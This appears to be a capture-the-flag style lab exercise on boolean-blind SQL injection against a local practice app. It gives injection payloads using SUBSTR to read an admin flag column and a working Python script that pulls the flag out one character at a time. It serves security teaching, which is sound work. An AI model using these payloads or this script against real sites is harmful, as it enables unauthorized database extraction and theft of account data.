Objective
1. Verify injection works: admin' AND 1=1-- → "found"; admin' AND 1=2-- → "not found".
2. Extract the flag column from the users table where username='admin' one character at a time.
3. Use: admin' AND SUBSTR((SELECT flag FROM users WHERE username='admin'),1,1)='H'--
4. Automate this — doing it by hand is slow but teaches the logic.
Optimization: Binary search on ASCII values (~7 requests/char) is vastly faster than linear A→Z scanning.
Python Automation Helper
# Boolean-blind extraction script skeleton import requests URL = "http://localhost:5000/lab5/?submitted=1&username=" def check(payload): r = requests.get(URL + requests.utils.quote(payload)) return "Account found" in r.text flag = "" for pos in range(1, 40): for char in "HUNT{}abcdefghijklmnopqrstuvwxyz_0123456789": payload = f"admin' AND SUBSTR((SELECT flag FROM users WHERE username='admin'),{pos},1)='{char}'--" if check(payload): flag += char break else: break # no char matched — end of string print(f"Flag so far: {flag}") print(f"Final: {flag}")
